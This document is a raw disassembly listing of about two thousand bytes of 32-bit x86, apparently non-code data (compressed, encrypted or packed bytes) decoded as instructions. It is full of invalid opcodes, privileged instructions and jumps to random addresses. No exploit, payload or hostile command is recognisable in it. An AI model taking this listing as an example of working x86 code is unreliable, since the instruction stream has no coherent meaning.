  407646:	shr    BYTE PTR [edi+eax*8],1
  407649:	adc    BYTE PTR [ebx+0x348684c9],cl
  40764f:	std    
  407650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407651:	or     al,bh
  407653:	mov    al,ds:0xc7352aeb
  407658:	pop    esp
  407659:	inc    ecx
  40765a:	lods   eax,DWORD PTR ds:[esi]
  40765b:	and    bl,dh
  40765d:	lea    eax,[ebx]
  40765f:	jnp    0x407644
  407661:	or     edx,DWORD PTR [eax-0x14d78be8]
  407667:	or     al,0x7a
  407669:	jmp    FWORD PTR [edx]
  40766b:	data16 add BYTE PTR [edi],ch
  40766e:	sub    edi,DWORD PTR [ebx]
  407670:	repz je 0x4076a9
  407673:	inc    esp
  407674:	inc    esi
  407675:	mov    dh,0x63
  407677:	lods   eax,DWORD PTR ds:[esi]
  407678:	jne    0x4076a0
  40767a:	mov    ah,0x6
  40767c:	(bad)  
  40767d:	fadd   QWORD PTR [eax+0x55da11e0]
  407683:	inc    esi
  407684:	add    al,0x58
  407686:	sub    bl,BYTE PTR [ebx+0x7b]
  407689:	ins    BYTE PTR es:[edi],dx
  40768a:	add    BYTE PTR ds:0x9a09ac0c,0x54
  407691:	cmp    al,0xa1
  407693:	int3   
  407694:	leave  
  407695:	mov    bh,dh
  407697:	mov    ds:0xca29d438,eax
  40769c:	fisttp DWORD PTR [ecx+0x50220f8]
  4076a2:	pop    ecx
  4076a3:	pop    esp
  4076a4:	mov    eax,0x851a86e1
  4076a9:	or     eax,0xba660dcc
  4076ae:	push   es
  4076af:	gs enter 0x5026,0x1c
  4076b4:	in     al,dx
  4076b5:	pop    ebx
  4076b6:	sbb    esi,DWORD PTR [edi]
  4076b8:	push   0x24
  4076ba:	xchg   edi,eax
  4076bb:	pushf  
  4076bc:	inc    edi
  4076bd:	fs pop es
  4076bf:	cmp    al,0x83
  4076c1:	pop    ecx
  4076c2:	lods   al,BYTE PTR ds:[esi]
  4076c3:	(bad)  
  4076c4:	mov    esp,0x4ba2cbd1
  4076c9:	mov    esi,0x564e9b21
  4076ce:	dec    ecx
  4076cf:	call   0x93962ef4
  4076d4:	or     ebp,DWORD PTR [ebx+0x43]
  4076d7:	adc    al,0xa8
  4076d9:	sbb    DWORD PTR [esi+0x5e],0x5b
  4076dd:	dec    edi
  4076de:	je     0x4076e6
  4076e0:	and    ebp,ebx
  4076e2:	inc    edx
  4076e3:	std    
  4076e4:	adc    esi,DWORD PTR ds:0xfc326817
  4076ea:	cld    
  4076eb:	fwait
  4076ec:	pop    esp
  4076ed:	adc    al,0xc3
  4076ef:	gs xchg edx,eax
  4076f1:	in     eax,dx
  4076f2:	add    ebx,DWORD PTR [edx-0xfdfd915]
  4076f8:	lock inc edx
  4076fa:	xchg   DWORD PTR [ebx+ebx*4],ebp
  4076fd:	hlt    
  4076fe:	pop    ebx
  4076ff:	(bad)  
  407700:	hlt    
  407701:	add    eax,0x40772a32
  407706:	and    ch,BYTE PTR [esi]
  407708:	retf   
  407709:	test   eax,0x9182a432
  40770e:	xchg   edx,eax
  40770f:	mov    bl,0x2b
  407711:	pmulhuw mm4,QWORD PTR ds:0xce864b5
  407718:	int3   
  407719:	outs   dx,DWORD PTR ds:[esi]
  40771a:	fs mov al,0x31
  40771d:	fdivr  QWORD PTR ds:0x4d168463
  407723:	xchg   ecx,eax
  407724:	out    dx,eax
  407725:	or     eax,0xd9086af6
  40772a:	push   ebx
  40772b:	and    ch,bl
  40772d:	hlt    
  40772e:	inc    ebp
  40772f:	les    ebx,FWORD PTR [edx+0x6b]
  407732:	pushf  
  407733:	loopne 0x407741
  407735:	fdivr  st(3),st
  407737:	xlat   BYTE PTR ds:[ebx]
  407738:	add    ecx,edx
  40773a:	imul   ecx,DWORD PTR [ebp+0x409af821],0xffffff8b
  407741:	inc    ebp
  407742:	add    BYTE PTR [ebx-0x28349000],0x7f
  407749:	mov    eax,0x88cb2c35
  40774e:	fsub   QWORD PTR [ebx+edx*8]
  407751:	retf   
  407752:	icebp  
  407753:	pop    es
  407754:	push   ss
  407755:	in     al,0xc8
  407757:	int3   
  407758:	push   esp
  407759:	xabort 0x1c
  40775c:	jbe    0x407702
  40775e:	in     al,0x53
  407760:	mov    edi,0x1ecf458d
  407765:	aas    
  407766:	xor    ecx,DWORD PTR [eax+0x47]
  407769:	neg    BYTE PTR [esi+0x4]
  40776c:	cmp    eax,ebx
  40776e:	mov    ch,0xd2
  407770:	jo     0x407719
  407772:	aaa    
  407773:	or     BYTE PTR [ebp+0x71f5cd3],dl
  407779:	nop
  40777a:	arpl   WORD PTR [esi+0xc10c2c6],cx
  407780:	test   ch,cl
  407782:	pusha  
  407783:	push   0x9
  407785:	and    edi,DWORD PTR [ecx]
  407787:	fldcw  WORD PTR [edi]
  407789:	xchg   BYTE PTR [edx],ah
  40778b:	pop    ss
  40778c:	hlt    
  40778d:	aas    
  40778e:	xchg   edx,eax
  40778f:	xor    BYTE PTR [eax+ebx*1],cl
  407792:	add    BYTE PTR [ebp+ebp*2-0x78],0x2b
  407797:	mov    cl,BYTE PTR [ebx+0x11]
  40779a:	xor    eax,esi
  40779c:	add    DWORD PTR [eax-0x49bf0d83],eax
  4077a2:	lods   eax,DWORD PTR ds:[esi]
  4077a3:	imul   edx,DWORD PTR [ecx-0x7e],0xffffffe4
  4077a7:	int    0x55
  4077a9:	ret    0xa7d1
  4077ac:	push   0xffffffea
  4077ae:	mov    ecx,ebx
  4077b0:	adc    ebp,esi
  4077b2:	push   eax
  4077b3:	dec    edi
  4077b4:	lods   eax,DWORD PTR ds:[esi]
  4077b5:	adc    BYTE PTR [edi],cl
  4077b7:	sbb    al,0x58
  4077b9:	in     al,dx
  4077ba:	test   BYTE PTR [ecx-0x32c2bdbd],bh
  4077c0:	pop    esp
  4077c1:	inc    eax
  4077c2:	and    BYTE PTR ds:0x8adacd4d,0x59
  4077c9:	out    0xd3,eax
  4077cb:	push   cs
  4077cc:	loopne 0x4077f4
  4077ce:	daa    
  4077cf:	mov    WORD PTR [esi-0x2e],?
  4077d2:	xchg   ecx,eax
  4077d3:	lea    esp,[edx-0x78d3f40e]
  4077d9:	shl    BYTE PTR [esp+edx*1+0x237870f],1
  4077e0:	mov    ecx,0x280fdd34
  4077e5:	int    0x9e
  4077e7:	add    esi,edx
  4077e9:	dec    dh
  4077eb:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4077ed:	imul   ebx,DWORD PTR [edx+0x7c5b41a6],0xd359ba9d
  4077f7:	xor    eax,0xb5cfd797
  4077fc:	into   
  4077fd:	or     edi,esp
  4077ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407800:	punpckhwd mm3,QWORD PTR [edx+0x17036c66]
  407807:	xor    cl,BYTE PTR [esi+0x69]
  40780a:	push   0x37
  40780c:	sub    DWORD PTR [eax-0x2d5c7579],ebp
  407812:	ds pop edx
  407814:	arpl   WORD PTR [ebx],bp
  407816:	mov    ecx,0xdfb99ff
  40781b:	loopne 0x407825
  40781d:	mov    ds:0xdc28b918,al
  407822:	add    al,0x8e
  407824:	enter  0xac77,0xab
  407828:	inc    ebx
  407829:	adc    BYTE PTR [edi],ah
  40782b:	test   al,bl
  40782d:	sar    BYTE PTR [esi],0x8e
  407830:	les    ecx,FWORD PTR [edi]
  407832:	mov    edi,0xdc645e82
  407837:	(bad)  
  407838:	sbb    cl,BYTE PTR [esi]
  40783a:	fs mov dl,0xd2
  40783d:	add    BYTE PTR [ecx],bl
  40783f:	clc    
  407840:	fst    DWORD PTR [esi-0x3b]
  407843:	push   es
  407844:	rcl    DWORD PTR [esi],1
  407846:	cmp    ebx,ebx
  407848:	inc    eax
  407849:	daa    
  40784a:	adc    BYTE PTR [ecx],0x8a
  40784d:	data16 jno 0x407806
  407850:	and    BYTE PTR [ebx],al
  407852:	xor    ah,BYTE PTR [eax+0x20]
  407855:	(bad)  
  407857:	jo     0x4078c5
  407859:	pop    ds
  40785a:	enter  0xfff0,0x73
  40785e:	or     al,0x2
  407860:	or     BYTE PTR [esi-0x13693d99],dl
  407866:	jge    0x407832
  407868:	js     0x407886
  40786a:	call   0x96813c28
  40786f:	mov    al,0xe8
  407871:	retf   
  407872:	xchg   esi,eax
  407873:	in     al,dx
  407874:	sar    BYTE PTR [eax],0x15
  407877:	mov    al,0xbf
  407879:	in     al,0x24
  40787b:	mov    dh,0x67
  40787d:	dec    ebx
  40787e:	and    eax,0xcabb66c1
  407883:	call   0x268358a2
  407888:	sti    
  407889:	inc    edx
  40788a:	fmul   QWORD PTR [edi]
  40788c:	mov    esi,0x3217dcf0
  407891:	pop    ecx
  407892:	shl    DWORD PTR [eax-0x76],cl
  407895:	sbb    ebx,eax
  407897:	aam    0x37
  407899:	nop
  40789a:	leave  
  40789b:	or     al,ch
  40789d:	sbb    dl,ah
  40789f:	push   0x22a66cd9
  4078a4:	test   ecx,ebp
  4078a6:	rcr    BYTE PTR [edi+0x50],1
  4078a9:	ins    BYTE PTR es:[edi],dx
  4078aa:	mov    al,0x3
  4078ac:	fs ror ah,1
  4078af:	sbb    al,0xcc
  4078b1:	cmp    ah,BYTE PTR [eax+0x33]
  4078b4:	sbb    al,0x84
  4078b6:	pop    ecx
  4078b7:	repz data16 and al,0x64
  4078bb:	cmp    edx,esi
  4078bd:	enter  0xcb3e,0xac
  4078c1:	sub    eax,ecx
  4078c3:	xor    al,0xff
  4078c5:	or     ecx,DWORD PTR [ebp-0x4]
  4078c8:	jmp    0xcaff:0x660774c9
  4078cf:	je     0x4078e2
  4078d1:	jmp    0x4078fb
  4078d3:	push   ebx
  4078d4:	jb     0x40793a
  4078d6:	mov    al,0x19
  4078d8:	adc    dh,BYTE PTR [edi]
  4078da:	(bad)  
  4078db:	int3   
  4078dc:	js     0x40786c
  4078de:	mov    ebx,0x23c4c818
  4078e3:	je     0x1387eff4
  4078e9:	das    
  4078ea:	inc    eax
  4078eb:	cmc    
  4078ec:	and    eax,0xf879bfff
  4078f1:	mov    BYTE PTR [edi+0x6e],cl
  4078f4:	xchg   edi,eax
  4078f5:	addr16 in al,0x1
  4078f8:	test   eax,edx
  4078fa:	daa    
  4078fb:	add    edx,edx
  4078fd:	add    al,0xd0
  4078ff:	jnp    0x40792f
  407901:	dec    ebp
  407902:	shl    DWORD PTR [eax+ebx*4],cl
  407905:	mov    ah,0xd7
  407907:	cli    
  407908:	rcr    DWORD PTR [ecx],1
  40790a:	dec    ecx
  40790b:	mov    bl,0x25
  40790d:	imul   edi,DWORD PTR [eax],0x23
  407910:	cmovns esi,esi
  407913:	shl    DWORD PTR [ecx*8+0x66d1036f],cl
  40791a:	and    DWORD PTR [eax-0x31e4f743],0x55
  407921:	(bad)  
  407923:	fst    DWORD PTR [edi+0x0]
  407926:	dec    ecx
  407927:	push   cs
  407928:	jnp    0x407941
  40792a:	xor    al,al
  40792c:	mov    esp,0xc8bc1bf6
  407931:	fs sbb al,0x12
  407934:	psubusw mm0,QWORD PTR [eax]
  407937:	cmp    DWORD PTR [eax+0x364325c8],edi
  40793d:	mov    eax,0x3cb4dd22
  407942:	mov    ds:0x1db43242,al
  407947:	ins    BYTE PTR es:[edi],dx
  407948:	and    BYTE PTR [ebx-0x4f4fa194],al
  40794e:	push   ds
  40794f:	nop
  407950:	mov    al,0xc1
  407952:	mov    eax,0x1eac60ac
  407957:	xchg   ebp,eax
  407958:	sbb    esp,ebp
  40795a:	sti    
  40795b:	pop    ecx
  40795c:	mov    edx,DWORD PTR [edx]
  40795e:	adc    BYTE PTR [eax-0x50],bl
  407961:	test   al,0xef
  407963:	inc    edx
  407964:	push   es
  407965:	ret    
  407966:	sbb    al,0x4e
  407968:	test   al,0xa4
  40796a:	jmp    0xa4be:0x90e42ef9
  407971:	mov    al,ds:0xe790b61c
  407976:	inc    edx
  407977:	push   cs
  407978:	mov    al,ds:0x8ce3b79c
  40797d:	and    esp,ebx
  40797f:	pushf  
  407980:	sbb    BYTE PTR [eax],al
  407982:	push   ebp
  407983:	cwde   
  407984:	cmp    BYTE PTR [esi-0x27],dh
  407987:	inc    ecx
  407988:	push   es
  407989:	cwde   
  40798a:	jmp    0x4079f4
  40798c:	rcl    BYTE PTR [ebx+ebx*1+0xc87181c],0x94
  407994:	dec    esp
  407995:	push   ecx
  407996:	jmp    0x40796e
  407998:	popa   
  407999:	xchg   ebx,eax
  40799a:	je     0x4079ea
  40799c:	nop
  40799d:	nop
  40799e:	and    ebp,DWORD PTR [eax]
  4079a0:	daa    
  4079a1:	jne    0x4079d4
  4079a3:	xchg   BYTE PTR [ebx],cl
  4079a5:	daa    
  4079a6:	xor    bl,ah
  4079a8:	lds    edx,FWORD PTR [edx+eax*2]
  4079ab:	loopne 0x4079f9
  4079ad:	mov    dl,0x29
  4079af:	mov    WORD PTR [edx+eax*1-0xd3b3fd0],cs
  4079b6:	rcr    BYTE PTR [eax+0x694748c],cl
  4079bc:	add    edx,DWORD PTR [ebx]
  4079be:	loop   0x407968
  4079c0:	cmp    bh,dl
  4079c2:	test   DWORD PTR [edx+0x441300cb],esi
  4079c8:	scas   al,BYTE PTR es:[edi]
  4079c9:	add    al,0x19
  4079cb:	mov    cl,cl
  4079cd:	xchg   ebp,eax
  4079ce:	shr    esi,0xb7
  4079d1:	xor    bl,BYTE PTR [eax-0x10246f3f]
  4079d7:	in     al,dx
  4079d8:	stos   DWORD PTR es:[edi],eax
  4079d9:	in     al,0x4
  4079db:	repnz ror DWORD PTR [edx-0x2d],cl
  4079df:	sub    eax,0xc8c1b25d
  4079e4:	or     BYTE PTR [eax],al
  4079e6:	push   esi
  4079e7:	jmp    0xc0b366d8
  4079ec:	and    BYTE PTR [ecx+ebp*1-0x21],ah
  4079f0:	shl    DWORD PTR [ecx+ebx*1],cl
  4079f3:	cmp    al,0xeb
  4079f5:	inc    eax
  4079f6:	rcl    DWORD PTR [ecx-0x63],cl
  4079f9:	xor    esi,DWORD PTR [eax]
  4079fb:	ja     0x407a22
  4079fd:	(bad)  
  4079fe:	xor    BYTE PTR [eax-0x25],bl
  407a01:	shr    DWORD PTR [esi+0x4f25e483],cl
  407a07:	aam    0x80
  407a09:	xor    edx,ebx
  407a0b:	mov    ch,0xb3
  407a0d:	xchg   ecx,eax
  407a0e:	rol    ebx,0xe0
  407a11:	push   ebx
  407a12:	sbb    ah,al
  407a14:	loopne 0x407a80
  407a16:	add    BYTE PTR fs:[ebx-0x118b2b37],al
  407a1d:	fs enter 0x860,0x87
  407a22:	aam    0x57
  407a24:	cmp    ch,bl
  407a26:	fs nop
  407a28:	gs loope 0x407a7b
  407a2b:	sub    eax,esp
  407a2d:	in     al,dx
  407a2e:	loopne 0x4079e0
  407a30:	xchg   ecx,eax
  407a31:	les    ebp,FWORD PTR [ebx]
  407a33:	aam    0x5e
  407a35:	add    DWORD PTR [eax+ecx*2],ebx
  407a38:	bound  eax,QWORD PTR [edx+0x29467b3b]
  407a3e:	push   ds
  407a3f:	add    DWORD PTR [eax+ecx*2+0x62],0xdb1e1f90
  407a47:	inc    ebx
  407a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a49:	in     al,0xd9
  407a4b:	retf   0xd42a
  407a4e:	mov    ebp,0xa69ad503
  407a53:	imul   ebx,DWORD PTR [edx+0x60451d11],0x97349b7a
  407a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a5e:	imul   edi,DWORD PTR [ecx+ebx*8-0x1f38290a],0xd3580be6
  407a69:	push   cs
  407a6a:	mov    dh,0xf
  407a6c:	add    ebp,DWORD PTR [ecx]
  407a6e:	inc    esi
  407a6f:	mov    ds:0x60449a69,al
  407a74:	jnp    0x407a0f
  407a76:	push   ds
  407a77:	xor    ebp,DWORD PTR [ebp-0x26837f1c]
  407a7d:	push   eax
  407a7e:	or     BYTE PTR [eax],al
  407a80:	pop    ebx
  407a81:	dec    ecx
  407a82:	les    ecx,FWORD PTR [esi]
  407a84:	mov    edi,0x41a1e27
  407a89:	pop    ebx
  407a8a:	dec    ecx
  407a8b:	sub    al,0x1e
  407a8d:	sbb    DWORD PTR [edx],edx
  407a8f:	rcl    DWORD PTR [esi+0x48],0x1e
  407a93:	and    BYTE PTR [esi],bl
  407a95:	add    DWORD PTR [eax+esi*4+0x15],0x256c1e20
  407a9d:	xor    DWORD PTR [ebx+0x33],edi
  407aa0:	ins    BYTE PTR es:[edi],dx
  407aa1:	sbb    al,0x1e
  407aa3:	sbb    al,0xc
  407aa5:	mov    dh,0x92
  407aa7:	mov    eax,0xe4ad1b56
  407aac:	mov    DWORD PTR [ecx-0x1beeb7f3],eax
  407ab2:	xor    dl,BYTE PTR [ecx]
  407ab4:	loop   0x407a78
  407ab6:	push   es
  407ab7:	fs loopne 0x407a9a
  407aba:	jecxz  0x407a98
  407abc:	and    al,0x2e
  407abe:	in     al,dx
  407abf:	inc    eax
  407ac0:	adc    esp,ebx
  407ac2:	sbb    ebx,eax
  407ac4:	adc    DWORD PTR [ebx-0x27f93f3c],edx
  407aca:	sbb    dl,BYTE PTR [ecx]
  407acc:	aam    0x92
  407ace:	pop    eax
  407acf:	fldenv [eax]
  407ad1:	aam    0xdc
  407ad3:	cs xor ecx,ebp
  407ad6:	pop    edx
  407ad7:	cmp    bh,BYTE PTR ss:[edi-0x24df99d7]
  407ade:	mov    cl,0x6
  407ae0:	int3   
  407ae1:	cwde   
  407ae2:	rcr    BYTE PTR [esi+esi*4+0x42364dcc],cl
  407ae9:	bound  edx,QWORD PTR [ecx]
  407aeb:	sahf   
  407aec:	enter  0x312,0x59
  407af0:	mov    ?,WORD PTR [edi]
  407af2:	rcl    DWORD PTR [eax+ecx*8+0x11],cl
  407af6:	out    0xc9,al
  407af8:	in     eax,dx
  407af9:	push   eax
  407afa:	xlat   BYTE PTR ds:[ebx]
  407afb:	cmp    DWORD PTR [ebx],eax
  407afd:	fst    DWORD PTR [esi]
  407aff:	xlat   BYTE PTR ds:[ebx]
  407b00:	lea    ecx,[ebp+0x73]
  407b03:	imul   ebx,DWORD PTR [edx-0x27163956],0x2d4a2b0c
  407b0d:	imul   esi,DWORD PTR [esi+0x5b0b2364],0x8
  407b14:	punpckhbw mm3,QWORD PTR [edx-0x27fc065a]
  407b1b:	js     0x407ab2
  407b1d:	mov    dl,0xcf
  407b1f:	in     al,dx
  407b20:	or     esp,DWORD PTR [ecx+0x42]
  407b23:	xchg   esi,eax
  407b24:	adc    esp,eax
  407b26:	les    ecx,FWORD PTR [ecx+0x31]
  407b29:	mov    al,0x3
  407b2b:	mov    eax,eax
  407b2d:	adc    eax,eax
  407b2f:	sbb    edx,DWORD PTR [eax+0x1121720d]
  407b35:	mov    esp,0x6cb022bc
  407b3a:	test   ah,al
  407b3c:	fnsave [edx+eiz*1]
  407b3f:	and    DWORD PTR [esi+eax*8],ecx
  407b42:	pusha  
  407b43:	xor    DWORD PTR [ecx+edx*2-0x126fb54c],esi
  407b4a:	inc    edx
  407b4b:	and    dh,BYTE PTR [eax]
  407b4d:	mov    al,0x1e
  407b4f:	mov    al,0x6
  407b51:	stc    
  407b52:	es xchg ecx,eax
  407b54:	adc    DWORD PTR [eax+0x30b8ac40],esi
  407b5a:	es and al,0x11
  407b5d:	lods   al,BYTE PTR ds:[esi]
  407b5e:	dec    esi
  407b5f:	test   al,0x89
  407b61:	or     ebx,DWORD PTR [ebx-0x1557ee70]
  407b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b68:	adc    DWORD PTR [ebx],esp
  407b6a:	mov    cl,0xb0
  407b6c:	or     DWORD PTR [esp+ebx*1-0x4ede48d2],esp
  407b73:	ins    BYTE PTR es:[edi],dx
  407b74:	and    edx,eax
  407b76:	adc    DWORD PTR [edx+eax*4],esp
  407b79:	or     al,0xc6
  407b7b:	pushf  
  407b7c:	cmp    BYTE PTR [ecx+edx*1-0x4edb91ee],bl
  407b83:	sub    eax,0x3264111b
  407b88:	sahf   
  407b89:	add    edx,esp
  407b8b:	adc    BYTE PTR [esi+ecx*2+0x20c87994],0x11
  407b93:	adc    DWORD PTR [ebx],esi
  407b95:	sar    DWORD PTR [eax+0x3b264158],cl
  407b9b:	nop
  407b9c:	sub    DWORD PTR [eax+0xde4bef5],edx
  407ba2:	push   cs
  407ba3:	(bad)  
  407ba5:	jmp    0x5ba:0x9802ba90
  407bac:	mov    DWORD PTR [ebx],eax
  407bae:	mov    ecx,0xb8ac1e24
  407bb3:	add    al,0x20
  407bb5:	pop    es
  407bb6:	mov    dl,0x2d
  407bb8:	xor    ecx,eax
  407bba:	shl    al,1
  407bbc:	or     cl,BYTE PTR [ecx-0x6fc71b8d]
  407bc2:	lds    ecx,FWORD PTR [ebx]
  407bc4:	push   ecx
  407bc5:	rcr    DWORD PTR [ebx],0x80
  407bc8:	or     BYTE PTR [edx+0x1a],dh
  407bcb:	clc    
  407bcc:	adc    DWORD PTR [ebx-0x1a0bf7b9],esi
  407bd2:	mov    edx,esp
  407bd4:	mov    ds:0x6f314159,al
  407bd9:	daa    
  407bda:	adc    cl,BYTE PTR [edx]
  407bdc:	jle    0x407b6e
  407bde:	imul   eax,DWORD PTR [ebp+0x6d],0x70
  407be2:	je     0x407c5d
  407be4:	jmp    0x407b81
  407be6:	das    
  407be7:	inc    edx
  407be8:	lock dec esi
  407bea:	jne    0x407bc7
  407bec:	invd   
  407bee:	push   ebx
  407bef:	ins    DWORD PTR es:[edi],dx
  407bf0:	ret    
  407bf1:	pop    edx
  407bf2:	add    DWORD PTR [ecx+eiz*2-0x27ec46f0],esi
  407bf9:	pop    ebp
  407bfa:	adc    al,0x99
  407bfc:	pop    es
  407bfd:	jmp    0x23b2e169
  407c02:	stc    
  407c03:	fs (bad) 
  407c06:	push   es
  407c07:	pop    ds
  407c08:	ins    BYTE PTR es:[di],dx
  407c0a:	add    BYTE PTR gs:[edi],cl
  407c0d:	inc    esp
  407c0e:	outs   dx,DWORD PTR ds:[esi]
  407c0f:	jne    0x407c73
  407c11:	inc    esi
  407c12:	sar    edi,0xd
  407c15:	inc    ebx
  407c16:	inc    ebx
  407c17:	jne    0x407c8b
  407c19:	jb     0x407c80
  407c1b:	outs   dx,BYTE PTR ds:[esi]
  407c1c:	arpl   WORD PTR [ebx+0x56],dx
  407c1f:	je     0x407c29
  407c21:	push   es
  407c22:	dec    esp
  407c23:	pop    ebx
  407c24:	popa   
  407c25:	xchg   DWORD PTR [eax+0x7f304f5d],esp
  407c2b:	xor    esp,DWORD PTR ds:0x4eaa417b
  407c31:	and    ebp,DWORD PTR [ebx+0x53b2c10d]
  407c37:	mov    esp,0x64658087
  407c3c:	xchg   ebx,eax
  407c3d:	sub    bl,cl
  407c3f:	popa   
  407c40:	outs   dx,BYTE PTR ds:[esi]
  407c41:	jns    0x4c379e66
  407c47:	(bad)  
  407c48:	push   ebp
  407c49:	outs   dx,BYTE PTR ds:[esi]
  407c4a:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  407c4e:	inc    esp
  407c4f:	arpl   WORD PTR gs:[ecx-0x32],bp
  407c53:	fld    TBYTE PTR [esi]
  407c55:	sti    
  407c56:	mov    al,0x57
  407c58:	and    al,0x30
  407c5a:	inc    esi
  407c5b:	out    0x68,eax
  407c5d:	pop    edx
  407c5e:	je     0x407c38
  407c60:	cmovnp ebx,DWORD PTR [esi]
  407c63:	cwde   
  407c64:	mov    ds:0x571b7942,eax
  407c69:	pop    esp
  407c6a:	adc    eax,0x726fe40c
  407c6f:	fs in  al,dx
  407c71:	push   esp
  407c72:	in     al,dx
  407c73:	faddp  st(0),st
  407c75:	adc    esp,DWORD PTR [ebx+0x14343642]
  407c7b:	add    ecx,DWORD PTR [eax+0x5ecfe321]
  407c81:	push   ss
  407c82:	iret   
  407c83:	adc    eax,0xdcc20a30
  407c88:	and    BYTE PTR [esi+0x62c1ad8],0xfb
  407c8f:	mov    eax,ds:0x6aa3b0e7
  407c94:	mov    ds:0x7714fff1,eax
  407c99:	push   ss
  407c9a:	inc    ecx
  407c9b:	fcom   st(7)
  407c9d:	adc    ecx,DWORD PTR [eax+0x43f421ed]
  407ca3:	sbb    al,0xe7
  407ca5:	fdivr  QWORD PTR [edi]
  407ca7:	and    bl,bh
  407ca9:	cdq    
  407caa:	mov    al,0x6e
  407cac:	pop    ebx
  407cad:	jmp    0x407cc0
  407caf:	sbb    al,0xba
  407cb1:	ss cwde 
  407cb3:	pop    ss
  407cb4:	add    DWORD PTR ds:0xe64e84f,eax
  407cba:	test   al,0xb7
  407cbc:	jno    0x407c4b
  407cbe:	inc    edi
  407cbf:	lds    eax,FWORD PTR [edi+0x3bca7c98]
  407cc5:	lea    edx,[esi+0x38]
  407cc8:	add    bl,dh
  407cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ccb:	push   cs
  407ccc:	xchg   ebp,eax
  407ccd:	cld    
  407cce:	jl     0x407cbe
  407cd0:	addr16 lock data16 adc al,0x8d
  407cd5:	lar    eax,WORD PTR [edx]
  407cd8:	stc    
  407cd9:	popa   
  407cda:	mov    edx,0x24d41a27
  407cdf:	(bad)  
  407ce0:	out    dx,al
  407ce1:	das    
  407ce2:	xchg   esp,eax
  407ce3:	jne    0x407cfd
  407ce5:	pop    ebx
  407ce6:	ins    BYTE PTR es:[edi],dx
  407ce7:	lea    esi,[eax+0x5f64c78f]
  407ced:	(bad)  
  407cee:	mov    esi,0xc311ace8
  407cf3:	adc    eax,0x302912d7
  407cf8:	sbb    BYTE PTR [ecx],bl
  407cfa:	ins    BYTE PTR es:[edi],dx
  407cfb:	mov    al,0xf6
  407cfd:	test   bh,0x20
  407d00:	je     0x407c85
  407d02:	test   DWORD PTR [edx+edx*1+0x45203b40],esi
  407d09:	les    edx,FWORD PTR cs:[esp+ebx*8]
  407d0d:	mov    DWORD PTR [esi-0x76],edi
  407d10:	add    DWORD PTR [ebx-0x12ecb8a2],ecx
  407d16:	stos   DWORD PTR es:[edi],eax
  407d17:	mov    ds:0x4f0c4c64,al
  407d1c:	xchg   ecx,eax
  407d1d:	xchg   BYTE PTR [ecx+ecx*1],bh
  407d20:	aam    0xff
  407d22:	inc    ecx
  407d23:	outs   dx,BYTE PTR ds:[esi]
  407d24:	jns    0x407d6d
  407d26:	dec    esi
  407d27:	clc    
  407d28:	add    dh,bh
  407d2a:	and    BYTE PTR [ebx-0x749aadfa],ah
  407d30:	and    eax,0xf66b804
  407d35:	pop    es
  407d36:	or     BYTE PTR [eax-0x10b91afa],0x3
  407d3d:	or     al,BYTE PTR [ecx-0x46]
  407d40:	shl    BYTE PTR [esi-0x29],cl
  407d43:	push   0xdc8002bf
  407d48:	enter  0x7d17,0xf4
  407d4c:	adc    ah,cl
  407d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d4f:	add    BYTE PTR [edi],al
  407d51:	xor    BYTE PTR [edx],dh
  407d53:	mov    ah,0x86
  407d55:	adc    DWORD PTR [ebp+edx*8-0x6e],ebp
  407d59:	jo     0x407dd1
  407d5b:	mov    ecx,0x5f231d0d
  407d60:	push   esi
  407d61:	mov    esi,0x4681c8f
  407d66:	cmp    DWORD PTR [esi-0xb],edx
  407d69:	inc    ecx
  407d6a:	inc    esp
  407d6b:	test   al,0x3b
  407d6d:	fnsave [ebp-0x3e]
  407d70:	in     eax,dx
  407d71:	add    edx,DWORD PTR ds:0x6c5839aa
  407d77:	dec    ebx
  407d78:	sbb    DWORD PTR [ecx-0x2ea43fb9],0x7c
  407d7f:	clc    
  407d80:	mov    eax,DWORD PTR [eax+ebx*4]
  407d83:	push   ecx
  407d84:	das    
  407d85:	push   0x5290a2b
  407d8a:	(bad)  [edi]
  407d8c:	cmp    esp,DWORD PTR [eax+0x77]
  407d8f:	pop    ss
  407d90:	push   DWORD PTR [ebp-0x18]
  407d93:	repz fnstsw WORD PTR [ebx+ecx*2+0x4b]
  407d98:	push   eax
  407d99:	test   DWORD PTR [ebx],esi
  407d9b:	shl    BYTE PTR [eax-0xe],1
  407d9e:	out    dx,al
  407d9f:	fsubr  QWORD PTR [ebx+0x75]
  407da2:	mov    dh,BYTE PTR [ebx-0x20e7fc]
  407da8:	cmp    ah,cl
  407daa:	std    
  407dab:	adc    al,0xec
  407dad:	mov    edx,esp
  407daf:	(bad)
  407db5:	sbb    al,BYTE PTR [edx]
  407db7:	cmp    DWORD PTR [eax-0x6f],edx
  407dba:	xlat   BYTE PTR ds:[ebx]
  407dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dbc:	stos   BYTE PTR es:[edi],al
  407dbd:	adc    ebx,DWORD PTR [esi]
  407dbf:	sbb    al,0xeb
  407dc1:	pop    es
  407dc2:	loop   0x407df8
  407dc4:	push   edi
  407dc5:	into   
  407dc6:	call   0x66a32e0
  407dcb:	jge    0x407d4d
  407dcd:	mov    ecx,0x3b7505f8
  407dd2:	jnp    0x407dd8
  407dd4:	je     0x407df5
  407dd6:	jl     0x407e1f
  407dd8:	test   DWORD PTR [ebp+0x11],edi
  407ddb:	fist   DWORD PTR [eax]
  407ddd:	pop    ds
  407dde:	into   
  407ddf:	xor    eax,0x7b0343f8
  407de4:	xchg   DWORD PTR [edx+0x5a8b7fc8],eax
  407dea:	inc    ecx
  407deb:	xor    BYTE PTR [eax+0xb],0xed
  407def:	data16 aam 0xc4
  407df2:	xlat   BYTE PTR ds:[ebx]
  407df3:	xor    eax,0x35c67b3f
  407df8:	cmp    al,ch
  407dfa:	inc    ebp
  407dfb:	out    dx,eax
  407dfc:	jge    0x407df5
  407dfe:	sbb    eax,0x52148da4
  407e03:	add    edx,0x448a70f0
  407e09:	add    dl,dh
  407e0b:	inc    ecx
  407e0c:	xor    al,0xe2
  407e0e:	ins    BYTE PTR es:[edi],dx
